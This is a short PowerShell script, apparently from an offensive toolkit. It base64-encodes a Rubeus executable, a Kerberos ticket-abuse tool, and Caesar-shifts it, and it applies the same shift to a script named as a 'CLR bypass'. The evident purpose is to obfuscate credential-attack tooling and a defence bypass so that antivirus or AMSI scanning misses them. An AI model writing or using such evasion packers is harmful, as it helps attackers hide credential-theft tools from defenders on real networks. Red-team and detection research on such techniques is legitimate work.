
if ($PSScriptRoot) {
    # If $PSScriptRoot is defined, use it
    $workingDir = $PSScriptRoot
    Write-Host "Using the script's directory: $workingDir"
}
else {
    $workingDir = (Get-Location).Path
    Write-Host "Using the current working directory: $workingDir"
}

# $RPath and #CPath are the filenames of Rubeus64 and CLR bypass and must be set accordingly

$RPath = "$workingDir\R.exe"
$RPathB64   = "$workingDir\r.txt"
$RdestPathC   = "$workingDir\renc.txt"
$CPath = "$workingDir\clrbp.ps1"
$CdestPathC = "$workingDir\clrbp.ps1.txt"



# Encrypting Rubeus

[Convert]::ToBase64String([IO.File]::ReadAllBytes($RPath)) | Out-File -Encoding ASCII $RPathB64

.\caesar_to_output_file.ps1 -Shift 3 -InputFile $RPathB64 -OutputFile $RdestPathC

# Encrypting CLR bypass

.\caesar_to_output_file.ps1 -Shift 3 -InputFile $CPath -OutputFile $CdestPathC

